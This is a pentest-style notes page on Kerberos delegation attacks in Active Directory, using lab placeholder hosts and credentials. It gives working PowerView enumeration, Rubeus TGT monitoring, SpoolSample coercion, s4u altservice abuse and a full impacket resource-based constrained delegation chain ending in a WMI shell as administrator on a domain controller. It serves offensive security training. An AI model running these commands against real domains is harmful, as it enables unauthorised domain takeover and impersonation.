## Delegation Attacks

This page highlights three primary attacks against delegation: Unconstrained, Constrained, and Resource-Based Constrained.

#### Unconstrained Delegation

Unconstrained delegation lets a service or user act on behalf of another user to access a service. This was introduced to satisfy the need for multiple backend components to communicate. Consider a web application and database. The user interacts with the web application, which needs to interact with the database server. There needed to be a way to allow the web server to "act on behalf of" the user. Thus, delegation was born... With big issues!

When unconstrained delegation is enabled, TGS requests will include the requesting users TGT inside it. The receiving server extracts the TGT, passes it on to the DB to authenticate. However, it also caches the TGT in its kerberos cache. Therefore, if you can compromise an account with unconstrained delegation and force authentication from a target machine, you can extract the TGT from the cache and impersonate those users.

We can use Powerview to find computers with unconstrained delegation available:

✨✨ https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 ✨✨

```powershell
Get-NetComputer -Unconstrained | select samaccountname
```

You need to compromise the target with unconstrained delegation enabled. Then, using a tool such as Rubeus, start listening for new TGT requests.

```powershell
\Rubeus.exe monitor /targetuser:Neo /interval:60
```

To trigger an authentication request from a domain controller, we can use SpoolSample.exe (In amongst many other techniques - a simple Google will show multiple). This uses the MS-RPRN Print System Remote protocol which handles servers between print clients and servers. It uses the `RpcRemoteFindFirstPrinterChangeNotificationEx()` to send a state change from machine A to machine B. This triggers an authentication request. Using the access to a machine with unconstrained delegation enabvled, this can be caught whilst monitoring for TGT traffic and used to authenticate as the targeted user.

#### Constrained Delegation

With the release of constrained delegation, TGT's are no longer cached on the "middleman" machine. Furthermore, the services which can be accessed on behalf of the requesting user are limited. Constrained delegation can be applied to users and computers.

We can find users or computers with it enabled using Powerview and examining the `useraccountcontrol` field. We want to see `TRUSTED_TO_AUTH_FOR_DELEGATION`. The `msds-allowedtodelegateto` field shows which services the computer or user is allowed to delegate to. 

```powershell
Get-NetUser -TrustedToAuth
Get-NetComputer dc04 | select name, msds-allowedtodelegateto, useraccountcontrol
```

##### Just this service, sir?

The s4u protocol doesn't validate the service provided in the ticket is real, meaning we can use add the `/altservice:<service>` to the request to request alternative services to the one listed in the `msds-allowedtodelegateto` field.


#### Resource-Based Constrained Delegation

##### Attacking from Kali

```bash
# Add the computer fakecomputer$
impacket-addcomputer -computer-name 'fakecomputer$' -computer-pass 'Summer2018!' -dc-ip 10.10.10.10 'MATRIX.local/Neo:Passw0rd'

# Perform the rbcd
python3 rbcd.py -f FAKECOMPUTER -t DC04 -dc-ip 10.10.10.10 MATRIX.local\\Neo:Neo:Passw0rd  

# Get a service ticket for the file system of the target machine
impacket-getST -spn cifs/DC04.matrix.local -impersonate administrator -dc-ip 10.10.10.10 matrix.local/FAKECOMPUTER$:'Summer2018!'

# Export the output .ccache file
export KRB5CCNAME=`pwd`/administrator.ccache

# If not already installed (Enter matrix.local when asked for realm)
sudo apt install krb5-user 
# edit /etc/hosts to have all valid IPs resolving to hosts

# Login using the kerberos ticket
proxychains impacket-wmiexec administrator@DC04.matrix.local -k -no-pass
```
